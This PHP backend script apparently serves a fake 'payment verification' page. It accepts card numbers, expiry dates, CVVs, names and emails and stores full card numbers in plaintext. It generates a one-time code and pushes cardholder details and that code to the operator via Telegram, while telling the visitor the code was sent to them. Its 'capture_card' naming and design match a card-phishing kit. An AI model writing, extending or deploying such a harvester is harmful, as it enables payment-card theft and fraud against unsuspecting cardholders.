<?php
require_once 'config.php';

$action = sanitizeInput($_POST['action'] ?? '');

if ($action === 'capture_card') {
    handleCardCapture();
} elseif ($action === 'verify_otp') {
    handleOTPVerification();
} else {
    json_response(['success' => false, 'message' => 'Invalid action']);
}

function handleCardCapture() {
    global $db;
    
    // Validate reCAPTCHA
    $recaptchaToken = $_POST['recaptchaToken'] ?? '';
    if (!verifyRecaptcha($recaptchaToken)) {
        logVisitor('recaptcha_failed', []);
        json_response(['success' => false, 'message' => 'reCAPTCHA verification failed. Please try again.']);
    }
    
    // Validate required fields
    $cardNumber = sanitizeInput($_POST['cardNumber'] ?? '');
    $expiryDate = sanitizeInput($_POST['expiryDate'] ?? '');
    $cvv = sanitizeInput($_POST['cvv'] ?? '');
    $cardholderName = sanitizeInput($_POST['cardholderName'] ?? '');
    $email = sanitizeInput($_POST['email'] ?? '');
    
    // Basic validation
    if (!preg_match('/^\d{16}$/', $cardNumber)) {
        json_response(['success' => false, 'message' => 'Invalid card number']);
    }
    
    if (!preg_match('/^\d{2}\/\d{2}$/', $expiryDate)) {
        json_response(['success' => false, 'message' => 'Invalid expiry date']);
    }
    
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        json_response(['success' => false, 'message' => 'Invalid CVV']);
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        json_response(['success' => false, 'message' => 'Invalid email address']);
    }
    
    // Rate limiting check (5 attempts per IP per hour)
    $ip = $_SERVER['REMOTE_ADDR'];
    $result = $db->query("SELECT COUNT(*) as count FROM transactions WHERE ip_address = '$ip' AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)");
    $row = $result->fetch_assoc();
    
    if ($row['count'] >= 5) {
        logVisitor('rate_limit_exceeded', ['ip' => $ip]);
        json_response(['success' => false, 'message' => 'Too many attempts. Please try again later.']);
    }
    
    // Generate OTP and session
    $otp = generateOTP();
    $sessionId = generateSessionId();
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    
    // Store transaction
    $query = "INSERT INTO transactions (session_id, card_number, cardholder_name, email, expiry_date, otp_code, ip_address, status) 
              VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')";
    
    $stmt = $db->prepare($query);
    if (!$stmt) {
        error_log('Database error: ' . $db->error);
        json_response(['success' => false, 'message' => 'Database error']);
    }
    
    $stmt->bind_param('sssssss', $sessionId, $cardNumber, $cardholderName, $email, $expiryDate, $otp, $ipAddress);
    
    if (!$stmt->execute()) {
        error_log('Database error: ' . $db->error);
        json_response(['success' => false, 'message' => 'Database error']);
    }
    $stmt->close();
    
    // Log visitor action
    logVisitor('card_captured', [
        'email' => $email,
        'cardholder' => $cardholderName,
        'last_4_digits' => substr($cardNumber, -4)
    ]);
    
    // Send Telegram notification
    $telegramMessage = "🔐 <b>New Payment Verification</b>\n\n";
    $telegramMessage .= "<b>Cardholder:</b> " . htmlspecialchars($cardholderName) . "\n";
    $telegramMessage .= "<b>Email:</b> " . htmlspecialchars($email) . "\n";
    $telegramMessage .= "<b>Card:</b> ****" . substr($cardNumber, -4) . "\n";
    $telegramMessage .= "<b>IP Address:</b> " . $ipAddress . "\n";
    $telegramMessage .= "<b>OTP Code:</b> <code>" . $otp . "</code>\n";
    $telegramMessage .= "<b>Timestamp:</b> " . date('Y-m-d H:i:s');
    
    $telegramSent = sendTelegramMessage($telegramMessage);
    
    if (!$telegramSent) {
        error_log('Telegram notification failed for session: ' . $sessionId);
    }
    
    json_response([
        'success' => true,
        'message' => 'Verification code sent to your email and Telegram',
        'sessionId' => $sessionId,
        'telegramNotified' => $telegramSent
    ]);
}

function handleOTPVerification() {
    global $db;
    
    $sessionId = sanitizeInput($_POST['sessionId'] ?? '');
    $otpCode = sanitizeInput($_POST['otpCode'] ?? '');
    
    if (empty($sessionId) || empty($otpCode)) {
        json_response(['success' => false, 'message' => 'Missing required fields']);
    }
    
    // Get transaction
    $query = "SELECT * FROM transactions WHERE session_id = ? AND status = 'pending'";
    $stmt = $db->prepare($query);
    if (!$stmt) {
        json_response(['success' => false, 'message' => 'Database error']);
    }
    
    $stmt->bind_param('s', $sessionId);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        logVisitor('otp_session_not_found', ['session_id' => $sessionId]);
        json_response(['success' => false, 'message' => 'Session not found or already verified']);
    }
    
    $transaction = $result->fetch_assoc();
    $stmt->close();
    
    // Verify OTP
    if ($transaction['otp_code'] !== $otpCode) {
        logVisitor('otp_failed', ['session_id' => $sessionId, 'ip' => $_SERVER['REMOTE_ADDR']]);
        json_response(['success' => false, 'message' => 'Invalid verification code']);
    }
    
    // Update transaction status
    $verifiedAt = date('Y-m-d H:i:s');
    $query = "UPDATE transactions SET status = 'verified', otp_verified = TRUE, verified_at = ? WHERE session_id = ?";
    $stmt = $db->prepare($query);
    $stmt->bind_param('ss', $verifiedAt, $sessionId);
    $stmt->execute();
    $stmt->close();
    
    // Log successful verification
    logVisitor('otp_verified', [
        'email' => $transaction['email'],
        'session_id' => $sessionId,
        'cardholder' => $transaction['cardholder_name']
    ]);
    
    // Send Telegram success notification
    $telegramMessage = "✅ <b>Payment Verified Successfully</b>\n\n";
    $telegramMessage .= "<b>Cardholder:</b> " . htmlspecialchars($transaction['cardholder_name']) . "\n";
    $telegramMessage .= "<b>Email:</b> " . htmlspecialchars($transaction['email']) . "\n";
    $telegramMessage .= "<b>Card:</b> ****" . substr($transaction['card_number'], -4) . "\n";
    $telegramMessage .= "<b>Verified At:</b> " . $verifiedAt;
    
    sendTelegramMessage($telegramMessage);
    
    json_response([
        'success' => true,
        'message' => 'Payment verified successfully'
    ]);
}
?>
